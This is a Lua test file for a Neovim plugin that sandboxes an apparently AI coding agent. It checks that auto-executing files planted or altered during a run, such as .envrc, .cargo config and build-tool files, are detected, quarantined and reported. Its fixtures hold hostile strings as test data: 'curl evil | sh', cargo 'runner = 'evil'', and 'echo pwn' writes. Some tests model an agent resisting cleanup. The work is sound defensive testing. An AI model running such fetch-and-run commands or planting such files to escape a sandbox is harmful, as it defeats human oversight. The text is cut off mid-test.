-- Eighth round: the sweep compares CONTENT (a moved protected name, an existing one changed deep in the tree),
-- more auto-exec names, a quarantine that survives chmod 555 parents, nested skipped directories and the exact
-- subdirectory mount budget (the runner, the proxy and the scan have their own round8_*_spec.lua files).
local H = require("xynotest.helpers")
local sb = require("xyno_sandbox")
local plan = require("xyno_sandbox.plan")
local guard = require("xyno_sandbox.guard")
local store = require("xyno_sandbox.store")
local uv = vim.uv

local saved = vim.deepcopy(sb.config)
before_each(function()
  store.dir_override = H.tmpdir() .. "/state"
end)
after_each(function()
  store.dir_override = nil
  sb.config = vim.deepcopy(saved)
end)

local function write(path, text)
  vim.fn.mkdir(vim.fs.dirname(path), "p")
  local f = assert(io.open(path, "wb"))
  f:write(text or "x\n")
  f:close()
end

local function rel_list(project, paths)
  local out = {}
  for _, p in ipairs(paths) do
    out[#out + 1] = p:sub(#project + 2)
  end
  return out
end

local function inside(project, script)
  H.need_sandbox()
  sb.config.network = "open"
  local cmd, err, h = sb.wrap({ "bash", "-c", script }, project, H.tmpdir())
  H.ok(cmd, err)
  local r = vim.system(cmd, { cwd = project, text = true }):wait(60000)
  h.release()
  return (r.stdout or "") .. (r.stderr or "")
end

-- a wrap() whose launch snapshot is taken, then the project is changed from outside (what a run could have done
-- below the mask depth), then the run ends
local function launch(project)
  H.need_sandbox()
  sb.config.network = "open"
  local cmd, err, h = sb.wrap({ "true" }, project, H.tmpdir())
  H.ok(cmd, err)
  return h
end

local function set_time(path, sec)
  uv.fs_utime(path, sec, sec)
end

-- ------------------------------------------------------------------ (1) a moved protected name: its content is compared
describe("a protected name that was moved is compared by content, not trusted by inode", function()
  it("a renamed directory with a replaced .cargo/config.toml inside is reported with a diff", function()
    local project = H.tmpdir()
    write(project .. "/sub/.cargo/config.toml", "[build]\njobs = 2\n")
    local before = guard.snapshot(project)
    os.rename(project .. "/sub", project .. "/sub_old")
    write(project .. "/sub_old/.cargo/config.toml", "[target.x86_64-unknown-linux-gnu]\nrunner = 'evil'\n")
    local res = guard.compare(before, guard.snapshot(project))
    H.eq(1, #res.tampered, vim.inspect(res))
    H.eq(project .. "/sub/.cargo", res.tampered[1].from)
    H.eq(project .. "/sub_old/.cargo", res.tampered[1].to)
    H.eq(2, res.tampered[1].plus)
    H.eq(2, res.tampered[1].minus)
    H.eq({}, res.planted)
  end)

  it("a file added inside a moved directory is reported", function()
    local project = H.tmpdir()
    write(project .. "/sub/.cargo/config.toml", "[build]\n")
    local before = guard.snapshot(project)
    os.rename(project .. "/sub", project .. "/elsewhere")
    write(project .. "/elsewhere/.cargo/extra.toml", "runner = 'evil'\n")
    local res = guard.compare(before, guard.snapshot(project))
    H.eq(1, #res.tampered, vim.inspect(res))
    H.eq(project .. "/elsewhere/.cargo", res.tampered[1].to)
  end)

  it("a protected FILE moved to another directory with other content is reported", function()
    local project = H.tmpdir()
    write(project .. "/a/.envrc", "echo hi\n")
    vim.fn.mkdir(project .. "/b", "p")
    local before = guard.snapshot(project)
    os.rename(project .. "/a/.envrc", project .. "/b/.envrc")
    write(project .. "/b/.envrc", "curl evil | sh\n") -- same inode, new content
    local res = guard.compare(before, guard.snapshot(project))
    H.eq(1, #res.tampered, vim.inspect(res))
    H.eq(project .. "/b/.envrc", res.tampered[1].to)
    H.eq({}, res.planted)
  end)

  it("a plain rename with the same content is only 'moved'", function()
    local project = H.tmpdir()
    write(project .. "/sub/.cargo/config.toml", "[build]\n")
    write(project .. "/sub/.envrc", "x\n")
    local before = guard.snapshot(project)
    os.rename(project .. "/sub", project .. "/sub_old")
    local res = guard.compare(before, guard.snapshot(project))
    H.eq(2, #res.moved)
    H.eq({}, res.tampered)
    H.eq({}, res.planted)
    H.eq({}, res.modified)
  end)

  it("the end of the run marks the project and says what changed", function()
    local project = H.tmpdir()
    write(project .. "/sub/.cargo/config.toml", "[build]\n")
    local h = launch(project)
    os.rename(project .. "/sub", project .. "/sub_old")
    write(project .. "/sub_old/.cargo/config.toml", "[build]\nrunner = 'evil'\n")
    local notes = {}
    local old = vim.notify
    vim.notify = function(m, l)
      notes[#notes + 1] = { m, l }
    end
    h.release()
    vim.notify = old
    local rec = sb.dirty(project)
    H.ok(rec, "the project is marked")
    H.eq(1, #h.tampered)
    local text = vim.inspect(notes)
    H.match(text, "sub_old/.cargo", true)
    H.match(text, "+1 -0", true)
    sb.clear_dirty(project)
  end)
end)

-- ------------------------------------------------------------------ (3) an existing protected file that changed
describe("an existing protected file that changed is reported whatever its mtime says", function()
  it("same size, mtime put back: found by content", function()
    local project = H.tmpdir()
    write(project .. "/deep/er/.envrc", "AAAA\n")
    set_time(project .. "/deep/er/.envrc", 1700000000)
    local before = guard.snapshot(project)
    write(project .. "/deep/er/.envrc", "BBBB\n")
    set_time(project .. "/deep/er/.envrc", 1700000000)
    local res = guard.compare(before, guard.snapshot(project))
    H.eq({ project .. "/deep/er/.envrc" }, res.modified)
    H.eq(1, res.details[project .. "/deep/er/.envrc"].plus)
    H.eq(1, res.details[project .. "/deep/er/.envrc"].minus)
  end)

  it("the report names the file with lines added and removed", function()
    local project = H.tmpdir()
    write(project .. "/d/.envrc", "a\nb\n")
    local before = guard.snapshot(project)
    write(project .. "/d/.envrc", "a\nb\nc\nd\n")
    local lines = guard.report(guard.compare(before, guard.snapshot(project)))
    H.eq(1, #lines)
    H.match(lines[1], "/d/.envrc +2 -0", true)
  end)

  it("an unchanged file, and a file only touched, is not reported as edited", function()
    local project = H.tmpdir()
    write(project .. "/d/.envrc", "a\n")
    local before = guard.snapshot(project)
    local res = guard.compare(before, guard.snapshot(project))
    H.eq({}, res.modified)
    H.eq({}, res.tampered)
  end)

  it("at the end of a run it is a loud notice (ERROR level)", function()
    local project = H.tmpdir()
    write(project .. "/d/e/f/.envrc", "a\n")
    local h = launch(project)
    write(project .. "/d/e/f/.envrc", "b\n")
    local notes = {}
    local old = vim.notify
    vim.notify = function(m, l)
      notes[#notes + 1] = { m, l }
    end
    h.release()
    vim.notify = old
    local found
    for _, n in ipairs(notes) do
      if n[1]:find("d/e/f/.envrc", 1, true) and n[2] == vim.log.levels.ERROR then
        found = true
      end
    end
    H.ok(found, vim.inspect(notes))
  end)
end)

-- ------------------------------------------------------------------ (5) a planted non-empty read-only file
describe("an empty leftover is deleted, a planted non-empty read-only file is quarantined", function()
  it("0444 with content is kept in the quarantine and the project is marked", function()
    local project = H.tmpdir()
    vim.fn.mkdir(project .. "/x/y", "p")
    local h = launch(project)
    write(project .. "/x/y/.envrc", "curl evil | sh\n")
    uv.fs_chmod(project .. "/x/y/.envrc", tonumber("444", 8))
    h.release()
    H.eq(nil, uv.fs_lstat(project .. "/x/y/.envrc"))
    H.ok(sb.dirty(project), "marked")
    H.ok(h.quarantine, "a quarantine directory")
    local f = io.open(h.quarantine .. "/x/y/.envrc", "rb")
    H.ok(f, "the copy exists")
    H.eq("curl evil | sh\n", f:read("a"))
    f:close()
    sb.clear_dirty(project)
  end)

  it("an empty 0444 file (the placeholder of a renamed directory) is removed without a mark", function()
    local project = H.tmpdir()
    vim.fn.mkdir(project .. "/x", "p")
    local h = launch(project)
    write(project .. "/x/.envrc", "")
    uv.fs_chmod(project .. "/x/.envrc", tonumber("444", 8))
    h.release()
    H.eq(nil, uv.fs_lstat(project .. "/x/.envrc"))
    H.eq(nil, sb.dirty(project))
  end)
end)

-- ------------------------------------------------------------------ (4) quarantine with read-only parents
describe("the quarantine copes with a planted name whose parents are read-only", function()
  local function modes(p)
    return bit.band(uv.fs_lstat(p).mode, tonumber("777", 8))
  end

  it("a 555 parent directory", function()
    local project = H.tmpdir()
    vim.fn.mkdir(project .. "/p", "p")
    local h = launch(project)
    write(project .. "/p/.envrc", "evil\n")
    uv.fs_chmod(project .. "/p", tonumber("555", 8))
    h.release()
    H.eq(nil, uv.fs_lstat(project .. "/p/.envrc"))
    H.eq(tonumber("555", 8), modes(project .. "/p"), "the parent's mode is put back")
    local d = sb.dirty(project)
    H.ok(d)
    H.eq({}, d.failed)
    uv.fs_chmod(project .. "/p", tonumber("755", 8))
    sb.clear_dirty(project)
  end)

  it("a planted directory with 555 and 000 directories inside", function()
    local project = H.tmpdir()
    vim.fn.mkdir(project .. "/p", "p")
    local h = launch(project)
    write(project .. "/p/.cargo/in/config.toml", "runner = 'evil'\n")
    write(project .. "/p/.cargo/top.toml", "evil\n")
    uv.fs_chmod(project .. "/p/.cargo/in", tonumber("555", 8))
    uv.fs_chmod(project .. "/p/.cargo/top.toml", tonumber("000", 8))
    uv.fs_chmod(project .. "/p/.cargo", tonumber("555", 8))
    h.release()
    H.eq(nil, uv.fs_lstat(project .. "/p/.cargo"))
    local f = io.open(h.quarantine .. "/p/.cargo/in/config.toml", "rb")
    H.ok(f, "copied although unreadable directories had to be opened first")
    f:close()
    H.ok(io.open(h.quarantine .. "/p/.cargo/top.toml", "rb"), "a 000 file is copied too")
    H.eq({}, sb.dirty(project).failed)
    sb.clear_dirty(project)
  end)

  it("a directory that cannot be freed is named in the notice and in the mark", function()
    local project = H.tmpdir()
    vim.fn.mkdir(project .. "/p", "p")
    local h = launch(project)
    write(project .. "/p/.envrc", "evil\n")
    local orig = vim.fn.delete
    -- (a parent the agent made immutable is something chmod cannot undo: simulate by failing every delete)
    local old = guard._delete
    guard._delete = function()
      return -1
    end
    local notes = {}
    local oldn = vim.notify
    vim.notify = function(m, l)
      notes[#notes + 1] = m
    end
    h.release()
    vim.notify = oldn
    guard._delete = old
    H.eq(orig, vim.fn.delete)
    H.match(table.concat(notes, "\n"), "COULD NOT REMOVE", true)
    H.eq({ project .. "/p/.envrc" }, sb.dirty(project).failed)
    os.remove(project .. "/p/.envrc")
    sb.clear_dirty(project)
  end)
end)

-- ------------------------------------------------------------------ (6) skipped directories inside skipped directories
describe("a skipped directory nested in a skipped directory is entered in the second pass", function()
  it("target/ inside node_modules/ inside target/ with a planted name three levels down", function()
    local project = H.tmpdir()
    vim.fn.mkdir(project .. "/target/a/node_modules/b/target/c", "p")
    local before = guard.snapshot(project)
    write(project .. "/target/a/node_modules/b/target/c/.envrc", "evil\n")
    write(project .. "/target/a/node_modules/b/.cargo/config.toml", "evil\n")
    local res = guard.compare(before, guard.snapshot(project))
    H.eq(
      { "target/a/node_modules/b/.cargo", "target/a/node_modules/b/target/c/.envrc" },
      rel_list(project, res.planted)
    )
  end)

  it("they are counted against the second budget, not skipped", function()
    local project = H.tmpdir()
    vim.fn.mkdir(project .. "/node_modules/a/node_modules/b", "p")
    local snap = guard.snapshot(project)
    H.eq(4, snap.skip_dirs) -- node_modules, a, node_modules, b
  end)
end)

-- ------------------------------------------------------------------ (2) more auto-exec names
describe("round 8 names: covered or reviewed", function()
  local LOCKED = {
    ".devcontainer.json",
    ".bazelrc",
    ".bazelversion",
    ".bazeliskrc",
    ".lefthook",
    ".cargo-husky",
    ".sbtopts",
    ".jvmopts",
    ".bundle",
  }
  local REVIEW = {
    "lefthook-local.yml",
    "gradle.properties",
    "gradle-wrapper.properties",
    "build.gradle",
    "build.gradle.kts",
    "settings.gradle",
    "pom.xml",
    "build.sbt",
    "Gemfile",
    "Rakefile",
    ".rspec",
    "Procfile",
    ".nvmrc",
    ".node-version",
    ".python-version",
    ".ruby-version",
    ".gitattributes",
    ".tmuxp.yaml",
    ".tmuxinator.yml",
    "gradlew",
    "mvnw",
  }
  it("the tables name them (written out here)", function()
    for _, n in ipairs(LOCKED) do
      H.ok(vim.tbl_contains(plan.PROJECT_READONLY, n), "PROJECT_READONLY " .. n)
      H.ok(vim.tbl_contains(plan.MEMBER_READONLY, n), "MEMBER_READONLY " .. n)
      H.ok(vim.tbl_contains(plan.WATCH_NAMES, n), "WATCH_NAMES " .. n)
    end
    H.ok(vim.tbl_contains(plan.MEMBER_READONLY, ".gitmodules"))
    for _, n in ipairs(REVIEW) do
      H.ok(vim.tbl_contains(plan.REVIEW_NAMES, n), "REVIEW_NAMES " .. n)
    end
  end)

  it("real run: a present one is read-only at the root and in a subdirectory", function()
    H.need_sandbox()
    local project = H.tmpdir()
    local lines = {}
    for _, n in ipairs(LOCKED) do
      local dir = (n == ".lefthook" or n == ".cargo-husky" or n == ".bundle")
      for _, base in ipairs({ project, project .. "/sub" }) do
        if dir then
          vim.fn.mkdir(base .. "/" .. n, "p")
          write(base .. "/" .. n .. "/x")
          lines[#lines + 1] = ("echo pwn > '%s/%s/new' 2>/dev/null && echo WRITABLE:%s/%s"):format(base, n, base, n)
        else
          write(base .. "/" .. n, "orig\n")
          lines[#lines + 1] = ("echo pwn >> '%s/%s' 2>/dev/null && echo WRITABLE:%s/%s"):format(base, n, base, n)
        end
      end
    end
    local out = inside(project, table.concat(lines, "\n") .. "\necho DONE")
    H.match(out, "DONE", true, out)
    H.no_match(out, "WRITABLE", true, out)
  end)

  it("a copy planted in a deep directory is found by the sweep", function()
    local project = H.tmpdir()
    vim.fn.mkdir(project .. "/a/b/c/d", "p")
    local before = guard.snapshot(project)
    for _, n in ipairs({ ".bazelrc", ".devcontainer.json", ".sbtopts" }) do
      write(project .. "/a/b/c/d/" .. n, "evil\n")
    end
    vim.fn.mkdir(project .. "/a/b/c/d/.lefthook/pre-commit", "p")
    local res = guard.compare(before, guard.snapshot(project))
    H.eq(
      { "a/b/c/d/.bazelrc", "a/b/c/d/.devcontainer.json", "a/b/c/d/.lefthook", "a/b/c/d/.sbtopts" },
      rel_list(project, res.planted)
    )
  end)
end)

-- ------------------------------------------------------------------ (8) the subdirectory mount budget
local PROJECT, TMP, FHOME = "/h/proj", "/h/scratch", "/h"
local function fakefs(entries)
  return {
    stat_type = function(x)
      return entries[x]
    end,
    lstat_type = function(x)
      return entries[x]
    end,
    exists = function(x)
      return entries[x] ~= nil
    end,
    list = function(dir)
      local out, prefix = {}, dir == "/" and "/" or (dir .. "/")
      for x, t in pairs(entries) do
        if x:sub(1, #prefix) == prefix and not x:sub(#prefix + 1):find("/", 1, true) then
          out[#out + 1] = { x:sub(#prefix + 1), t }
        end
      end
      table.sort(out, function(a, b)
        return a[1] < b[1]
      end)
      return out
    end,
    glob = function()
      return {}
    end,
    read_line = function()
      return nil
    end,
    realpath = function(x)
      return entries[x] and x or nil
    end,
    stat_info = function()
      return nil
    end,
  }
end
local function build(extra)
  local entries = vim.tbl_extend("force", {
    [FHOME] = "directory",
    [FHOME .. "/.claude"] = "directory",
    [PROJECT] = "directory",
    [TMP] = "directory",
    [PROJECT .. "/.git"] = "directory",
  }, extra or {})
  return plan.build({
    project = PROJECT,
    tmp_dir = TMP,
    cwd = PROJECT,
    home = FHOME,
    uid = 1000,
    probes = fakefs(entries),
    env = { PATH = "/usr/bin" },
    cmd = { "agent" },
    aux = { empty = "/aux/empty", claude_json = "/aux/cj", git_dir = "/aux/git" },
    config = { network = "open" },
  })
end

describe("the subdirectory mount budget is exact and ordered", function()
  local DIRS = { "/.cargo", "/.claude", "/.vscode", "/.git" }
  local FILES_ = {
    "/.envrc",
    "/.mcp.json",
    "/.nvim.lua",
    "/.mise.toml",
    "/.exrc",
    "/.npmrc",
    "/.yarnrc.yml",
    "/.dir-locals.el",
    "/.lvimrc",
  }
  local PER_DIR = #DIRS + #FILES_
  local function with_max(n, extra)
    local old = plan.SUBDIR_MASK_MAX
    plan.SUBDIR_MASK_MAX = n
    local ok, p = pcall(build, extra)
    plan.SUBDIR_MASK_MAX = old
    assert(ok, p)
    local covered_ = {}
    for _, m in ipairs(p.masks) do
      covered_[m.path] = true
    end
    for _, g in ipairs(p.guard_files) do
      covered_[g.path] = true
    end
    return p, covered_
  end
  local TREE = {
    [PROJECT .. "/d1"] = "directory",
    [PROJECT .. "/d2"] = "directory",
    [PROJECT .. "/d1/deep"] = "directory",
  }

  it("the names are what this spec counts with", function()
    H.eq(
      DIRS,
      vim.tbl_map(function(n)
        return "/" .. n
      end, plan.SUBDIR_MASK_DIRS)
    )
    H.eq(PER_DIR, 13)
  end)

  it("a budget of N gives exactly N mounts (not N+1, not N-1)", function()
    for _, n in ipairs({ 1, 5, 13 }) do
      local p = with_max(n, TREE)
      H.eq(n, p.subdir_masks, "budget " .. n)
    end
  end)

  it("a budget of 0 gives none", function()
    local p, c = with_max(0, TREE)
    H.eq(0, p.subdir_masks)
    H.not_ok(c[PROJECT .. "/d1/.claude"])
  end)

  it("a budget that fits two directories covers both, the third (deeper) gets nothing", function()
    local p, c = with_max(2 * PER_DIR, TREE)
    H.eq(2 * PER_DIR, p.subdir_masks)
    for _, n in ipairs({ "d1", "d2" }) do
      for _, rel in ipairs(DIRS) do
        H.ok(c[PROJECT .. "/" .. n .. rel], n .. rel)
      end
      for _, rel in ipairs(FILES_) do
        H.ok(c[PROJECT .. "/" .. n .. rel], n .. rel)
      end
    end
    H.not_ok(c[PROJECT .. "/d1/deep/.cargo"], "the deeper directory is last")
  end)

  it("one more mount goes to the deeper directory, starting with .cargo", function()
    local p, c = with_max(2 * PER_DIR + 1, TREE)
    H.eq(2 * PER_DIR + 1, p.subdir_masks)
    H.ok(c[PROJECT .. "/d1/deep/.cargo"])
    H.not_ok(c[PROJECT .. "/d1/deep/.claude"])
  end)

  it("with equal depth the listing order decides: d1 is covered before d2", function()
    local p, c = with_max(PER_DIR, TREE)
    H.ok(c[PROJECT .. "/d1/.cargo"] and c[PROJECT .. "/d1/.lvimrc"])
    H.not_ok(c[PROJECT .. "/d2/.cargo"])
  end)

  it("a Cargo member has its own .cargo mask and spends none of the budget on it", function()
    local extra = vim.tbl_extend("force", TREE, { [PROJECT .. "/d1/Cargo.toml"] = "file" })
    local p, c = with_max(1000, extra)
    H.eq(3 * PER_DIR - 1, p.subdir_masks)
    local n = 0
    for _, m in ipairs(p.masks) do
      if m.path == PROJECT .. "/d1/.cargo" then
        n = n + 1
      end
    end
    H.eq(1, n, "masked once")
    H.ok(c[PROJECT .. "/d1/.cargo"])
    local p2 = with_max(PER_DIR - 1, extra)
    H.eq(PER_DIR - 1, p2.subdir_masks)
  end)

  it("an existing name takes no mount from the budget", function()
    local extra =
      vim.tbl_extend("force", TREE, { [PROJECT .. "/d1/.claude"] = "directory", [PROJECT .. "/d1/.envrc"] = "file" })
    local p = with_max(PER_DIR, extra)
    H.eq(PER_DIR, p.subdir_masks)
    H.ok(select(2, with_max(PER_DIR, extra))[PROJECT .. "/d2/.cargo"], "the two that exist leave room for d2's first")
  end)
end)

describe("the README and the help name what round 8 added", function()
  local text = H.docs_text()
  it("every locked and reviewed name is in the docs", function()
    for _, n in ipairs({
      ".devcontainer.json",
      ".bazelrc",
      ".bazelversion",
      ".bazeliskrc",
      ".lefthook",
      ".cargo-husky",
      ".sbtopts",
      ".jvmopts",
      ".bundle",
      "gradle.properties",
      "pom.xml",
      "Gemfile",
      "Procfile",
      ".nvmrc",
      ".python-version",
      ".gitattributes",
      "tampered",
    }) do
      H.match(text, n, true, n)
    end
  end)
end)

-- ------------------------------------------------------------------ (8) the content record, its limits and its words
describe("the content record: lines, names and what is unknown", function()
  local function cmp(setup, change)
    local project = H.tmpdir()
    setup(project)
    local before = guard.snapshot(project)
    change(project)
    return guard.compare(before, guard.snapshot(project)), project
  end

  it("a file without a trailing newline counts its last line, an empty file counts none", function()
    local res, project = cmp(function(p)
      write(p .. "/s/.cargo/a.toml", "x\n")
    end, function(p)
      os.rename(p .. "/s", p .. "/t")
      write(p .. "/t/.cargo/b.toml", "one\ntwo") -- 2 lines
      write(p .. "/t/.cargo/c.toml", "") -- 0 lines
      write(p .. "/t/.cargo/d.toml", "\n") -- 1 line
    end)
    H.eq(1, #res.tampered)
    H.eq(3, res.tampered[1].plus)
    H.eq(0, res.tampered[1].minus)
    H.eq({ "b.toml", "c.toml", "d.toml" }, res.tampered[1].names)
    H.eq(project .. "/t/.cargo", res.tampered[1].to)
  end)

  it("a deleted file inside counts its lines as removed", function()
    local res = cmp(function(p)
      write(p .. "/s/.cargo/a.toml", "1\n2\n3\n")
      write(p .. "/s/.cargo/b.toml", "x\n")
    end, function(p)
      os.rename(p .. "/s", p .. "/t")
      os.remove(p .. "/t/.cargo/a.toml")
    end)
    H.eq(0, res.tampered[1].plus)
    H.eq(3, res.tampered[1].minus)
    H.eq({ "a.toml" }, res.tampered[1].names)
  end)

  it("a protected FILE is named '(itself)'; a directory names the files that differ, sorted", function()
    local res = cmp(function(p)
      write(p .. "/a/.envrc", "x\n")
      write(p .. "/a/.cargo/z", "1\n")
      write(p .. "/a/.cargo/y", "1\n")
    end, function(p)
      write(p .. "/a/.envrc", "y\n")
      write(p .. "/a/.cargo/z", "2\n")
      write(p .. "/a/.cargo/y", "2\n")
    end)
    H.eq(2, #res.modified)
    local by = {}
    for path, d in pairs(res.details) do
      by[vim.fs.basename(path)] = d
    end
    H.eq({ "(itself)" }, by[".envrc"].names)
    H.eq({ "y", "z" }, by[".cargo"].names)
    H.eq(2, by[".cargo"].plus)
    H.eq(2, by[".cargo"].minus)
  end)

  it("a file whose text was not kept (over the size limit) makes the counts unknown, not zero", function()
    local old = guard.REVIEW_MAX_BYTES
    guard.REVIEW_MAX_BYTES = 16
    local ok, err = pcall(function()
      local res = cmp(function(p)
        write(p .. "/s/.cargo/a.toml", "x\n")
      end, function(p)
        os.rename(p .. "/s", p .. "/t")
        write(p .. "/t/.cargo/big.toml", ("y"):rep(64) .. "\n")
      end)
      H.eq(1, #res.tampered)
      H.eq(nil, res.tampered[1].plus)
      H.eq(nil, res.tampered[1].minus)
      H.eq({ "big.toml" }, res.tampered[1].names)
      local lines = guard.report(res)
      H.no_match(lines[1], "+", true, lines[1])
      H.match(lines[1], "big.toml", true)
    end)
    guard.REVIEW_MAX_BYTES = old
    assert(ok, err)
  end)

  it("a directory or a link added inside counts no lines", function()
    local res = cmp(function(p)
      write(p .. "/s/.cargo/a.toml", "x\n")
    end, function(p)
      os.rename(p .. "/s", p .. "/t")
      vim.fn.mkdir(p .. "/t/.cargo/sub", "p")
      uv.fs_symlink("a.toml", p .. "/t/.cargo/ln")
    end)
    H.eq(0, res.tampered[1].plus)
    H.eq(0, res.tampered[1].minus)
    H.eq({ "ln", "sub" }, res.tampered[1].names)
  end)

  it("a link whose target changed is a change", function()
    local res = cmp(function(p)
      uv.fs_symlink("one", p .. "/.envrc")
    end, function(p)
      os.remove(p .. "/.envrc")
      uv.fs_symlink("two", p .. "/.envrc")
    end)
    H.eq(1, #res.modified)
    H.match(res.modified[1], "/.envrc", true)
  end)

  it("a file only touched (same content, new mtime) is reported as changed with no lines", function()
    local project = H.tmpdir()
    write(project .. "/d/.envrc", "same\n")
    set_time(project .. "/d/.envrc", 1700000000)
    local before = guard.snapshot(project)
    set_time(project .. "/d/.envrc", 1700000500)
    local res = guard.compare(before, guard.snapshot(project))
    H.eq({ project .. "/d/.envrc" }, res.modified)
    H.eq(0, res.details[project .. "/d/.envrc"].plus)
    H.eq(0, res.details[project .. "/d/.envrc"].minus)
    H.eq({}, res.details[project .. "/d/.envrc"].names)
  end)

  it("an old-format snapshot (no inode table, no content) compares without error", function()
    local project = H.tmpdir()
    write(project .. "/d/.envrc", "a\n")
    local now = guard.snapshot(project)
    local old = { protected = vim.deepcopy(now.protected), review = {}, truncated = false }
    local res = guard.compare(old, now)
    H.eq({}, res.planted)
    H.eq({}, res.modified)
    local res2 = guard.compare({ protected = {}, review = {} }, now)
    H.eq({ project .. "/d/.envrc" }, res2.planted)
  end)
end)

describe("the content record: its limits are exact", function()
  local function id_of(project, rel)
    local snap = guard.snapshot(project)
    local c = snap.content[project .. "/" .. rel]
    return c and c.files[""] and c.files[""].id, c and c.files[""] and c.files[""].text, snap
  end
  local function with(field, value, fn)
    local old = guard[field]
    guard[field] = value
    local ok, err = pcall(fn)
    guard[field] = old
    assert(ok, err)
  end

  it("a file of exactly REVIEW_MAX_BYTES is hashed, one byte more is only a signature", function()
    local project = H.tmpdir()
    with("REVIEW_MAX_BYTES", 100, function()
      write(project .. "/.envrc", ("a"):rep(100))
      local id = id_of(project, ".envrc")
      H.eq("sha:", id:sub(1, 4))
      write(project .. "/.envrc", ("a"):rep(101))
      id = id_of(project, ".envrc")
      H.eq("sig:", id:sub(1, 4))
    end)
  end)

  it("the bytes read per snapshot are bounded: the file that would pass the bound is only a signature", function()
    local project = H.tmpdir()
    write(project .. "/a/.envrc", ("a"):rep(60))
    write(project .. "/b/.envrc", ("b"):rep(60))
    with("CONTENT_MAX_BYTES", 120, function()
      local sa = id_of(project, "a/.envrc")
      local sb_ = id_of(project, "b/.envrc")
      H.eq("sha:", sa:sub(1, 4))
      H.eq("sha:", sb_:sub(1, 4), "120 bytes in total is exactly the bound")
    end)
    with("CONTENT_MAX_BYTES", 119, function()
      local snap = guard.snapshot(project)
      local n = 0
      for _, c in pairs(snap.content) do
        if c.files[""].id:sub(1, 4) == "sig:" then
          n = n + 1
        end
      end
      H.eq(1, n, "one more byte than the bound: the second file is a signature")
    end)
  end)

  it("the text kept for the diff is bounded by REVIEW_KEEP_BYTES, exactly", function()
    local project = H.tmpdir()
    write(project .. "/a/.envrc", ("a"):rep(50))
    write(project .. "/b/.envrc", ("b"):rep(50))
    with("REVIEW_KEEP_BYTES", 100, function()
      local snap = guard.snapshot(project)
      H.ok(snap.content[project .. "/a/.envrc"].files[""].text)
      H.ok(snap.content[project .. "/b/.envrc"].files[""].text, "100 bytes kept is exactly the bound")
    end)
    with("REVIEW_KEEP_BYTES", 99, function()
      local snap = guard.snapshot(project)
      local kept = 0
      for _, c in pairs(snap.content) do
        if c.files[""].text then
          kept = kept + 1
        end
      end
      H.eq(1, kept)
    end)
  end)

  it("the hash of a protected name does not depend on the order of the listing and changes with any entry", function()
    local project = H.tmpdir()
    write(project .. "/.cargo/a", "1")
    write(project .. "/.cargo/b", "2")
    local h1 = guard.snapshot(project).content[project .. "/.cargo"].hash
    local h2 = guard.snapshot(project).content[project .. "/.cargo"].hash
    H.eq(h1, h2)
    write(project .. "/.cargo/b", "3")
    H.ok(h1 ~= guard.snapshot(project).content[project .. "/.cargo"].hash)
  end)
end)

describe("the words of the report and of the review mark", function()
  it("one tampered name: the refusal text names it; two say 'and 1 more'", function()
    local one = guard.dirty_reason({ planted = {}, tampered = { { from = "/p/a/.cargo", to = "/p/b/.cargo" } } })
    H.match(one, "A protected name was moved and its content changed (/p/a/.cargo -> /p/b/.cargo).", true)
    H.no_match(one, "more", true, one)
    H.no_match(one, "created", true, one)
    local two = guard.dirty_reason({
      planted = {},
      tampered = { { from = "/p/a", to = "/p/b" }, { from = "/p/c", to = "/p/d" } },
    })
    H.match(two, "(/p/a -> /p/b, and 1 more)", true)
    local three = guard.dirty_reason({
      planted = {},
      tampered = { { from = "/a", to = "/b" }, { from = "/c", to = "/d" }, { from = "/e", to = "/f" } },
    })
    H.match(three, "and 2 more", true)
  end)

  it("planted and tampered together: both sentences, one space between", function()
    local text = guard.dirty_reason({
      planted = { "/p/.envrc" },
      quarantine = "/q",
      tampered = { { from = "/a", to = "/b" } },
    })
    H.match(
      text,
      "created 1 file that run outside the sandbox (/p/.envrc) and they were removed from the project; a copy is in /q. A protected name was moved",
      true
    )
  end)

  it("a record with nothing in it still refuses, with the generic text", function()
    H.match(guard.dirty_reason({ planted = {}, tampered = {} }), "left this project marked for review", true)
    H.match(guard.dirty_reason({}), "left this project marked for review", true)
  end)

  it("the review line: the first 8 are listed, more are counted", function()
    local review = {}
    for i = 1, 9 do
      review[i] = { path = "/p/f" .. i, change = "changed", plus = i, minus = 0 }
    end
    local lines = guard.report({ review = vim.list_slice(review, 1, 8), modified = {}, tampered = {} })
    H.match(lines[1], "changed /p/f8 +8 -0", true)
    H.no_match(lines[1], "in all", true)
    lines = guard.report({ review = review, modified = {}, tampered = {} })
    H.match(lines[1], "changed /p/f8 +8 -0; ... 9 in all", true)
    H.no_match(lines[1], "/p/f9", true)
    lines = guard.report({ review = { { path = "/p/x", change = "created" } }, modified = {}, tampered = {} })
    H.match(lines[1], "created /p/x", true)
    H.no_match(lines[1], "+", true, lines[1])
  end)

  it("modified: with and without counts, 8 listed then the total", function()
    local mod, det = {}, {}
    for i = 1, 9 do
      mod[i] = "/p/m" .. i
      det[mod[i]] = { plus = i, minus = 1, names = {} }
    end
    local lines, loud =
      guard.report({ review = {}, modified = vim.list_slice(mod, 1, 8), details = det, tampered = {} })
    H.match(lines[1], "/p/m8 +8 -1", true)
    H.no_match(lines[1], "in all", true)
    H.eq(true, loud[1])
    lines = guard.report({ review = {}, modified = mod, details = det, tampered = {} })
    H.match(lines[1], ", ... 9 in all", true)
    H.no_match(lines[1], "/p/m9", true)
    lines = guard.report({ review = {}, modified = { "/p/n" }, details = { ["/p/n"] = { names = {} } }, tampered = {} })
    H.match(lines[1], "/p/n", true)
    H.no_match(lines[1], "+", true, lines[1])
    lines = guard.report({ review = {}, modified = { "/p/n" }, tampered = {} })
    H.match(lines[1], "/p/n", true)
  end)

  it(
    "tampered: the arrow, the counts when known, four names, 8 listed then the total; the second result marks them loud",
    function()
      local t = {}
      for i = 1, 9 do
        t[i] = { from = "/p/a" .. i, to = "/p/b" .. i, plus = i, minus = 2, names = { "a", "b", "c", "d", "e" } }
      end
      local lines, loud = guard.report({ review = {}, modified = {}, tampered = vim.list_slice(t, 1, 1) })
      H.match(lines[1], "/p/a1 -> /p/b1 +1 -2 (a, b, c, d)", true)
      H.no_match(lines[1], "e)", true, lines[1])
      H.eq(true, loud[1])
      lines = guard.report({ review = {}, modified = {}, tampered = t })
      H.match(lines[1], "; ... 9 in all", true)
      H.no_match(lines[1], "/p/b9", true)
      lines = guard.report({ review = {}, modified = {}, tampered = { { from = "/a", to = "/b", names = { "x" } } } })
      H.match(lines[1], "/a -> /b (x)", true)
      H.no_match(lines[1], "+", true, lines[1])
    end
  )

  it("the review line is not loud, the order of the lines is review, modified, tampered", function()
